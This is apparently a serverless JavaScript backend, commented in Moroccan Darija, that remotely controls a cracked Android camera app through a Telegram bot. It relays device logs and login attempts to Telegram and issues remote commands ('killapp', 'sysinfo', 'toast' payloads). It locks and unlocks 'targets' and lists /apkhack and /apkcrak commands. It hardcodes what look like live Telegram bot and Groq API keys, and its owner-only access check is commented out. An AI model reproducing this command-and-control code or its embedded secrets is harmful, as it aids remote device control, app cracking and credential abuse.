const TELEGRAM_TOKEN = "9108653103:AAFgJ4TeNS5vIq980-D-kuaLQ2C1FAMJbP4"; // التوكن الجديد ديالك
const TELEGRAM_CHAT_ID = "6655802251"; // معرف الشات ديالك (تقدر تبدلو إلا بغيتي)
const GROQ_API_KEY = process.env.GROQ_API_KEY || "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";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let activeDevice = "";
let keyExpiryTime = 0;
let totalAttempts = 0;
let recentLogs = [];
let remoteCommand = "";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const deviceId = req.query.device_id;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const maxLength = 4000;
      if (text.length > maxLength) {
        for (let i = 0; i < text.length; i += maxLength) {
           const chunk = text.substring(i, i + maxLength);
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
             body: JSON.stringify({ chat_id: chatId, text: chunk })
           }).catch(() => {});
        }
      } else {
        const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
        if (keyboard) payload.reply_markup = keyboard;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
        }).catch(() => {});
      }
    }
  };

  try {
    // 🔥 هاد الأجزاء هي اللي كتفتح تطبيق G vcam
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      return res.status(200).send(`"${saved || 'unlock'}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      return res.status(200).send(`"${saved || 'MODARK2026'}"`); 
    }
    if (type === 'message') {
      return res.status(200).send('"System Active"');
    }
    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') return res.status(200).send('"true"');
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      return res.status(200).send(inKv === 1 ? '"true"' : '"false"');
    }
    if (type === 'command') {
      if (deviceId && activeDevice === deviceId && keyExpiryTime > 0) {
        if (Date.now() > keyExpiryTime) {
          keyExpiryTime = 0;
          activeDevice = "";
          await kvCmd('SET', 'is_single_use', '0');
          return res.status(200).send('"killapp:1"');
        }
      }
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    // 🔥 هاد الجزء للبوت ديال تيليجرام
    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, '');
          
          if (type === 'key') {
            await kvCmd('SET', 'app_secret_key', cleanBody);
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          }
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop();
            await kvCmd('INCR', 'total_attempts');
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      
      // إلا بغيتي غير نتا اللي تقدر تتحكم ف البوت، حيد التعليق من السطر اللي تحت
      // if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      switch (command) {
        case '/start': case '/menu': 
          await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help."); 
          break;
        
        case '/help': 
          await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
            `⚡ *الأوامر:*\n` +
            `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n` +
            `/ai <prompt> - التحدث مع الذكاء الاصطناعي\n\n` +
            `⏱️ *التحكم بالوقت:*\n` +
            `/gentime <minutes> /settime <minutes>`); 
          break;
        
        case '/ai':
          if (args.length > 1) {
            const prompt = args.slice(1).join(' ');
            await sendToTelegram(`🤖 *[AI]* جاري التفكير...`);
            try {
              const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: { "Authorization": `Bearer ${GROQ_API_KEY}`, "Content-Type": "application/json" },
                body: JSON.stringify({
                  model: "llama-3.1-8b-instant",
                  messages: [{ role: "system", content: "أنت مساعد ذكي تجاوب بالدارجة." }, { role: "user", content: prompt }]
                })
              });
              const data = await groqRes.json();
              const aiText = data?.choices?.[0]?.message?.content || "ماقدرتش نجاوب.";
              await sendToTelegram(`🤖 *الذكاء الاصطناعي:*\n\n${aiText}`);
            } catch (e) { await sendToTelegram(`❌ *خطأ:* ${e.message}`); }
          } else { await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`"); }
          break;

        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*"); break;
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
        
        case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
        case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
        case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
        case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "MODARK2026"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
        
        case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
        
        default:
          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*`);
          else await sendToTelegram("❓ أمر غير معروف. كتب /help");
      }
      return res.status(200).end();
    }

    // 🔥 الرد الافتراضي باش التطبيق ما يعطيش Not Found
    return res.status(200).json({ status: "success", success: true, message: "Activated" });
    
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
